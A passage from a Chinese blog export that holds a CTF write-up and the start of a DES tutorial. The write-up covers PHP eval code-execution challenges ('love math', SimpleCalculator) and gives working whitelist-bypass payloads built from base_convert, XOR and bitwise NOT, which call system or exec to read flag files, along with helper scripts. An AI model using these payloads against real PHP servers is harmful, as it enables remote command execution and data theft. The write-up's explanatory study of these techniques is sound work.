class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get 传参 c ，长度限制 80 ，有黑白名单，简而言之，要求你构造一个用白名单函数，又不包括黑名单符号的 payload 来命令执行。</p>
<p>白名单中数学函数分两种利用方法，进制转换和异或，旨在调用<strong>能返回字符串</strong>的数学函数达到命令执行的目的。</p>
<hr>
<h3 id="数学函数的利用"><a href="#数学函数的利用" class="headerlink" title="数学函数的利用"></a>数学函数的利用</h3><h4 id="进制转换函数"><a href="#进制转换函数" class="headerlink" title="进制转换函数"></a>进制转换函数</h4><p>这里参考了 <a href="https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math">N0rths 一血师傅的博客</a></p>
<p>白名单里进制转换的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;base_convert&#39;, &#39;bindec&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;hexdec&#39;, &#39;decoct&#39;,&#39;octdec&#39;</span><br></pre></td></tr></table></figure>
<p>函数解释：</p>
<blockquote>
<p><code>base_convert(number,frombase,tobase)</code></p>
<p>在任意进制之间转换数字。</p>
<p><code>dechex(dec_number)</code></p>
<p>把十进制转换为十六进制。返回一个字符串，包含有给定 <em>binary_string</em> 参数的十六进制表示。所能转换的最大数值为十进制的 4294967295，其结果为 “ffffffff”。</p>
<p><code>hexdec(hex_string)</code></p>
<p>把十六进制转换为十进制。返回与 <em>hex_string</em> 参数所表示的十六进制数等值的的十进制数。</p>
<p>其他的 <code>decbin</code> <code>decbin</code> <code>decoct</code> <code>octdec</code> 同上，分别是二进制、八进制与十进制的互转。</p>
</blockquote>
<p>十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。</p>
<p>而 <code>base_convert</code> 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 <code>cat</code> 等命令就行了。</p>
<p>反过来构造，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&quot;cat&quot;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//15941</span></span><br></pre></td></tr></table></figure>
<p>但这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回 <code>.</code> <code>/</code> <code>*</code> 等特殊字符，而这就需要用到另一类运算函数。</p>
<h4 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h4><p>比如我们要构造 <code>system(&#39;cat *&#39;)</code></p>
<p>那么我们需要返回 <code>空格*</code> 这样的函数，而 php 中函数名默认为字符串，可以进行异或。</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/language.operators.bitwise.php">php 异或</a></p>
<p>php 中异或运算符 <code>^</code> 是位运算符，如果进行运算的都是数字的话：</p>
<p><img src="https://i.loli.net/2020/11/08/CjkqAViyOM7nEz4.png" alt=""></p>
<p>将会先转换为二进制来按位异或，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">12</span> ^ <span class="number">9</span>; <span class="comment">// Outputs &#x27;5&#x27;</span></span><br></pre></td></tr></table></figure>
<p>但如果进行运算的有字符串呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;12&quot;</span> ^ <span class="string">&quot;9&quot;</span>; <span class="comment">// Outputs the Backspace character (ascii 8)</span></span><br><span class="line">              <span class="comment">// (&#x27;1&#x27; (ascii 49)) ^ (&#x27;9&#x27; (ascii 57)) = #8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hallo&quot;</span> ^ <span class="string">&quot;hello&quot;</span>; <span class="comment">// Outputs the ascii values #0 #4 #0 #0 #0</span></span><br><span class="line">                     <span class="comment">// &#x27;a&#x27; ^ &#x27;e&#x27; = #4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span> ^ <span class="string">&quot;3&quot;</span>; <span class="comment">// Outputs 1</span></span><br><span class="line">           <span class="comment">// 2 ^ ((int)&quot;3&quot;) == 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2&quot;</span> ^ <span class="number">3</span>; <span class="comment">// Outputs 1</span></span><br><span class="line">           <span class="comment">// ((int)&quot;2&quot;) ^ 3 == 1</span></span><br></pre></td></tr></table></figure>
<p>长度一致时，会先把字符串按位转换为 ascii 码，再将 ascii 码转换为二进制进行按位异或，最后输出 ascii 为异或结果的字符。</p>
<p>长度不一致时，按最短的字符串长度按位异或，比如 <code>&quot;12&quot; ^ &quot;9&quot;</code> 的例子。</p>
<p>按位异或运算的几个性质：</p>
<ol>
<li><p>结合律 </p>
<p>a ^ b ^ c = a ^ c ^ b</p>
</li>
<li><p>交换律 </p>
<p>a ^ b = b ^ a</p>
</li>
<li><p>数值交换（能交换 a 与 b 的值）</p>
<p>a = a ^ b; b = a ^ b; a = a ^ b;</p>
</li>
</ol>
<p>而我们要构造有 <code>空格*</code> 该怎么利用异或呢？</p>
<p>由上面的性质 1 其实就已经明确了，<code>&quot;a&quot;^&quot;a&quot;</code> 结果是多少呢？相同即 0 ，也就是说，其 ascii 全 0 ，ascii 全 0 按位异或，得到的不就完全是另外一个 ascii 码吗，换言之，<code>&quot;a&quot;^&quot;x&quot;^&quot;a&quot;</code> 无论怎么调换顺序，输出的都是 x 的ascii 码 120 ，无论 x 被替换为什么，都是一样的结果。</p>
<p>这也是 N0rths 师傅在博客中写的脚本中是 <code>echo $k^$i^&quot; *&quot;;</code> 的原因，想得到 <code>空格*</code> 就找 <code>k</code> 和 <code>i</code> 能异或出另外一个数学函数 <code>dechex</code> 构造的值，取的值自然是我们这里的白名单函数，前面说过，函数名默认为字符串。</p>
<p>再简单地讲，就是要构造出想要的字符串 s ，如果有一个 <code>dechex(x)</code> 的值是 <code>k^s^i</code>，那我们得到 s 只需要这样构造：<code>dechex(x)^k^i</code> ，也就相当于，<code>k^i^s^k^i</code>。</p>
</blockquote>
<p>师傅的爆破脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">$whitelist2 = [ <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>,<span class="string">&#x27;abs&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($whitelist <span class="keyword">as</span> $i):</span><br><span class="line">    <span class="keyword">foreach</span> ($whitelist2 <span class="keyword">as</span> $k):</span><br><span class="line">    <span class="keyword">echo</span> $k^$i^<span class="string">&quot; *&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;   &quot;</span> . $i . <span class="string">&quot; &quot;</span> . $k;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">endforeach</span>;</span><br></pre></td></tr></table></figure>
<p>理解上述这些后，来分析下师傅最终的 payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(base_convert(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>).(dechex(<span class="number">16</span>)^asinh^pi))</span><br><span class="line"><span class="comment">//base_convert(1751504350,10,36) -&gt;system</span></span><br><span class="line"><span class="comment">//base_convert(15941,10,36) -&gt; cat</span></span><br><span class="line"><span class="comment">//system(&#x27;cat *&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/08/D5SXABlPIv3xsZO.png" alt=""></p>
<p>而 <code>dechex(16)</code> 返回的值正好是 10 ，所以 <code>dechex(16)^asinh^pi</code> 这个表达式就相当于 <code>asinh^pi^&quot; *&quot;^asinh^pi</code> 也就相当于 <code>&quot; *&quot;^&quot;a&quot;^&quot;a&quot;</code> 输出自然就是 <code>空格*</code> 。</p>
<p>当然构造不止 <code>asinh^pi</code> ，其他也能异或出 <code>空格*</code> ，只需要找到异或结果为十六进制形式的组合，再找到转十六进制与其相等的一个十进制数，利用 <code>hexdec()</code> 进行异或即可。</p>
<p><img src="https://i.loli.net/2020/11/08/6MCYo9y5jgTk4zR.png" alt=""></p>
<p><code>dechex(11)^atan2^pow</code> 的结果也为 <code>空格*</code> </p>
<p>当然，既然能异或出特殊字符，那么异或出字母也不是什么难事，我们可以不用进制转换来构造关键字。</p>
<p>这部分放在下面的构造 <code>_GET</code> 绕过来一起分析。</p>
<hr>
<p>接下来我们再来学习绕过的操作，N0rths 师傅是直接读取 flag 的，除了 <code>cat *</code> 以外，师傅还提到了 <code>nl f*</code> 这个命令来读取，以图为例：</p>
<p><img src="https://i.loli.net/2020/11/08/w1Et9YsB75GVacq.png" alt=""></p>
<p>命令解释：</p>
<blockquote>
<p><code>nl [参数] [文件]</code></p>
<p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p>
</blockquote>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="构造-GET"><a href="#构造-GET" class="headerlink" title="构造 _GET"></a>构造 _GET</h4><p>因为黑名单字符过滤较多，我们也可以用 <code>_GET[]</code> 来传 <code>system</code> 之类的命令，但 <code>[]</code> 被过滤了，师傅提到的一个 trick 就是 <code>&#123;&#125;</code> 代替 <code>[]</code> 。</p>
<p>先上 payload ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br><span class="line"><span class="comment">// base_convert(37907361743,10,36) -&gt; hex2bin</span></span><br><span class="line"><span class="comment">// dechex(1598506324) -&gt; 5f474554</span></span><br><span class="line"><span class="comment">// hex2bin(&quot;5f474554&quot;) -&gt; _GET</span></span><br></pre></td></tr></table></figure>
<p>payload 的 <code>($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)</code> 这一串又是什么意思呢？为什么能将变量 <code>pi</code> 的值作为函数使用？</p>
<p>这里牵扯到 php 可变变量和可变函数的用法。</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/language.variables.variable.php">php 可变变量</a></p>
<p>简而言之，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;land&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>而一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$$a = <span class="string">&quot;vidar&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这时，两个变量都被定义了：<code>$a</code> 的内容是 <code>“land”</code> 并且 <code>$land</code> 的内容是 <code>“vidar”</code> 。</p>
<p>回到正题，<code>$pi</code> 的值为 <code>hex2bin(&quot;5f474554&quot;)</code> ，<code>$$pi</code> 也就是 <code>$hex2bin(&quot;5f474554&quot;) -&gt; $_GET</code> ，变成了预定义变量。</p>
<p><a href="https://www.php.net/manual/zh/functions.variable-functions.php">php 可变函数</a></p>
<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>上面说过，<code>&#123;&#125;</code> 其实是代替 <code>[]</code> ，其实本为 <code>($$pi)[pi](($$pi)[abs])</code> ，即 <code>_GET[pi]((_GET)[abs])</code>  ，</p>
<p>而 <code>pi</code> 的值正好是 <code>system</code> ，php 就会寻找 <code>system</code> 函数来执行圆括号里的语句。</p>
<p>即 <code>system(&#39;tac flag.php&#39;)</code></p>
</blockquote>
<p>而上面说过，我们可以不利用进制转换，单纯异或构造语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));$pi=$$pi;$pi&#123;<span class="number">0</span>&#125;($pi&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure>
<p>同样这里利用了 php 可变变量和可变函数，但异或的对象有所不同，前文中明摆着我们是两个字符串相异或，而这里的 <code>is_nan^(6).(4)</code> 又会是什么结果呢？</p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">Mustapha Mond 师傅的 fuzz 脚本</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的 <code>$i.$j</code> 其实是字符串类型，也就是我们利用数学函数名与 01~99 范围的字符串相异或，这样我们可以得到字母（当然部分特殊字符也能得出）：</p>
<p><img src="https://i.loli.net/2020/11/08/jEyxkORKftGewN1.png" alt=""></p>
<p>而 payload 中的 <code>(is_nan^(6).(4)).(tan^(1).(5))</code> 正是 <code>&quot;_G&quot;.&quot;ET&quot;</code> ，即 <code>_GET</code> 。</p>
<h4 id="getallheaders-利用请求头传语句"><a href="#getallheaders-利用请求头传语句" class="headerlink" title="getallheaders 利用请求头传语句"></a>getallheaders 利用请求头传语句</h4><p>长度限制 80 是很容易超长的，何况还有白名单函数的限制，不能直接输入 <code>cat</code> 等命令，而我们可以利用 <code>getallheaders</code> 这个函数，把命令放在请求头来拼接语句。</p>
<p>函数解释：</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/function.getallheaders.php">getallheaders</a></p>
<p>获取全部 HTTP 请求头信息。</p>
</blockquote>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//base_convert(696468,10,36) -&gt; exec</span></span><br><span class="line"><span class="comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span></span><br><span class="line"><span class="comment">//exec(getallheaders()&#123;1&#125;)</span></span><br></pre></td></tr></table></figure>
<p>在报文头中相应属性，值为要执行的命令：</p>
<p><img src="https://i.loli.net/2020/11/08/68AXCBf1dwpvEYI.png" alt=""></p>
<p>好了，love math 到此告一段落，来看看今年的护网杯的 SimpleCalculator 。</p>
<h2 id="SimpleCalculator"><a href="#SimpleCalculator" class="headerlink" title="SimpleCalculator"></a>SimpleCalculator</h2><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>这题其实 love math 的异或 payload 就能打出来，摆出这道题其实只是为了介绍另外一种运算 <code>~</code> 。</p>
<blockquote>
<p><code>~</code> 运算符</p>
<p>按位取反，将 <code>$a</code> 中为 0 的位设为 1，反之亦然。</p>
<p>也就是说，我们要返回 <code>system</code> ，可以按位用其反码来构造 payload 。</p>
</blockquote>
<p>因为记忆比较模糊，可能说的不太准确，当初 fuzz 的时候，其实输入框的限制是非常严格的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ &#39; &quot; 空格 hex2bin、dechex、chr等等一些可以与字符互转的函数 system、exec等等一些可以命令执行的函数</span><br></pre></td></tr></table></figure>
<p>上面这些都被匹配到了，长度还限制 80 ，但对 url 上的却有松懈，因此可以说是 yt 。</p>
<p>这里要分析的是本校师傅给的一个神奇 payload ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ip=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>);$ip(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>);</span><br></pre></td></tr></table></figure>
<p><code>%8C%86%8C%8B%9A%92</code> 这些是 url 编码，解码后转换为 ascii 码，ascii 码再转换为二进制数，取其反码，然后逆操作，最后得到的值就是 <code>system</code> 。</p>
<p>以 <code>%8C</code> 为例，进行的运算用函数表示如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> chr(~ord(urldecode(<span class="string">&#x27;%8C&#x27;</span>)));</span><br><span class="line"><span class="comment">//s</span></span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pay = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">$re = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($pay); $i++)&#123;</span><br><span class="line">    $pay[$i] = chr(~ord($pay[$i]));</span><br><span class="line">    $re.= urlencode($pay[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $re;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实通篇看下来，最主要利用的是 php 位运算、可变变量、可变函数这些特性，用 math 函数结合 rce （这是次要的）。感觉还是要潜心学习一门语言，把它的特性深入了解后，才能在安全方面发挥最大作用。</p>
<p>声明：本文经安全客授权发布，转载请联系安全客平台。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RCE</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>DES攻略之原理篇</title>
    <url>/archives/681f5904.html</url>
    <content><![CDATA[<div class="note info">
            <p>此篇含大量数学公式，加载稍慢，请耐心等待。</p>
          </div>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>密码学课讲到了分组密码，故写文章总结一下要点，方便自己理解算法，参考了金晨辉等先生编著的《密码学》这本书，如有不当之处，还请在评论下方指出，我会及时进行检查修正，感谢！</p>
<p>接下来就是 DES 的回合了，多罗！</p>
<a id="more"></a>
<h1 id="DES-初识"><a href="#DES-初识" class="headerlink" title="DES 初识"></a>DES 初识</h1><h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>首先来介绍其算法。</p>
<p>DES 属于<strong>迭代型分组密码</strong>，是块加密的对称密钥加密算法（即发送方和接收方都使用相同的密钥来进行加密解密）。</p>
<p>迭代型分组密码算法有几个基本参数：</p>
<ul>
<li>分组长度</li>
<li>密钥长度</li>
<li>圈数（或迭代次数）</li>
<li>圈（子）密钥长度</li>
</ul>
<p>对于 DES 算法，其基本参数：</p>
<ul>
<li>分组长度 64 bit</li>
<li>密钥长度 64 bit（因每个密钥字节的最后一个比特用于奇偶校验，即每个密钥字节中所有比特的模 2 和为 0 ，故有效密钥长度为 56 bit）</li>
<li>圈数（或迭代次数）为 16</li>
<li>圈（子）密钥长度为 48 bit</li>
</ul>
<p>DES 的加、脱密算法运用的是同一个算法，二者唯一的不同之处就是圈（子）密钥的使用次序相反。</p>
<p>DES 也称为<strong>块加密的对称密钥加密算法</strong>（即发送方和接收方都使用相同的密钥来进行加密解密）。使用 56 bit 有效密钥加密 64 bit 的明文数据，当 n 个 64 bit 明文数据块都经过 DES 加密处理后，所得到的 n 个 64 bit 密文数据块串在一起就是密文输出。</p>
<h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p><img src="https://i.loli.net/2020/11/04/xd3oDsJZbX6z2TU.png" style="zoom:80%;" /></p>
<p>加密算法如图所示，我们需要学习的加密运算如下：</p>
<ul>
<li>初始置换 $IP$</li>
<li>迭代运算中的圈（轮）函数 $Q_k(x,y)$ </li>
<li>逆初始置换 $IP^{-1}$</li>
</ul>
<p>我们一一对其进行分析理解。</p>
<h3 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h3><p>初始置换 $IP$ 是对 64 比特的明文数据进行比特位置的移动。</p>
<p><img src="https://i.loli.net/2020/11/04/CuINgiUY7SLMEFB.png" style="zoom: 67%;" /></p>
<p>简而言之，就是按上面这张表进行变动，例如原来的第 58 比特经过变换后就变成了第 1 比特，第 50 比特经过变换后就变成了第 2 比特……，上面的数字代表的是原输入的比特位置，“代号入座”即可。</p>
<p>我们可以试着观察这张表，从列来看，最后一列 2、4、6、8、1、3、5、7 这八个位置的比特是不是同一字节的八比特？其他列也可以得出在同一字节中；从行来看，第一行的 58、50、42、34、26、18、10、2 这八个位置的比特是不是在八个字节中的同一位置（即第二个）？其他行同理。</p>
<p>综上，我们可以得出：</p>
<p>初始置换表的特点是，将输入的每个字节的第 i 个比特集中到输出的一个字节中。</p>
<h3 id="逆初始置换"><a href="#逆初始置换" class="headerlink" title="逆初始置换"></a>逆初始置换</h3><p>为了方便理解，最后的逆初始置换 $IP^{-1}$ 放到前面来讲。</p>
<p>逆初始置换，字面上理解就是与初始置换互逆，即对 16 圈迭代后的结果进行比特位置的移动，得到64 bit 密文，作用是为了保证脱密的正常进行。</p>
<p><img src="https://i.loli.net/2020/11/04/xdwGiUtafhvgbzk.png" style="zoom:67%;" /></p>
<p>同初始置换一样，就是简单的“对号入座”。当然，既然互逆，也能直接利用置换求逆的方式用 $IP$ 计算出来，同时也有下面的运算式：</p>
<script type="math/tex; mode=display">
IP^{-1}[IP(M)]=M</script><p>总结一下，这两个置换只是对输入数据的结构作调整，用以打乱数据的 ASCII 码字划分关系，其密码意义不大，对 DES 的安全性<strong>并不起本质作用</strong>。</p>
<p>另外说一点，这两张置换表是算法固定的，不需要进行计算，纯应试的朋友可以放心。</p>
